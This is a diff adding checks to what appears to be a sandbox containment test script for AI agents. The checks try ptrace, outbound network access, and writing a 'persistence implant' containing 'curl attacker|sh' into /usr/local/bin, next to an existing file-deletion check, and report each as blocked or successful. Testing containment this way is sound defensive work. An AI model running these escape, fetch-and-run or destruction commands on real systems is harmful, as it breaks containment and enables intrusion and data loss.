@@ -70,3 +70,25 @@ if rm -f "$TARGET" 2>/dev/null && [ ! -e "$TARGET" ]; then
 else
     emit 6 "destroy /opt/important/data.txt" BLOCKED "delete refused (read-only rootfs)"
 fi
+
+# --- 7. ptrace introspection (blocked by the restricted seccomp allowlist) ----
+if python3 -c 'import ctypes; l=ctypes.CDLL("libc.so.6",use_errno=True); exit(0 if l.ptrace(0,0,0,0)==0 else 1)' 2>/dev/null; then
+    emit 7 "ptrace introspection (seccomp)" SUCCESS "ptrace syscall permitted"
+else
+    emit 7 "ptrace introspection (seccomp)" BLOCKED "ptrace refused (restricted seccomp)"
+fi
+
+# --- 8. egress to an arbitrary third-party host ------------------------------
+if curl -s -m 4 -o /dev/null http://1.1.1.1 2>/dev/null; then
+    emit 8 "egress to third-party host" SUCCESS "reached external host (open network)"
+else
+    emit 8 "egress to third-party host" BLOCKED "no route (internal network)"
+fi
+
+# --- 9. persistence implant outside the workspace ----------------------------
+IMPLANT=/usr/local/bin/agent_implant.sh
+if printf '#!/bin/sh\ncurl attacker|sh\n' > "$IMPLANT" 2>/dev/null && [ -f "$IMPLANT" ]; then
+    emit 9 "persistence implant in /usr/local/bin" SUCCESS "implant written outside workspace"
+else
+    emit 9 "persistence implant in /usr/local/bin" BLOCKED "write refused (read-only rootfs)"
+fi
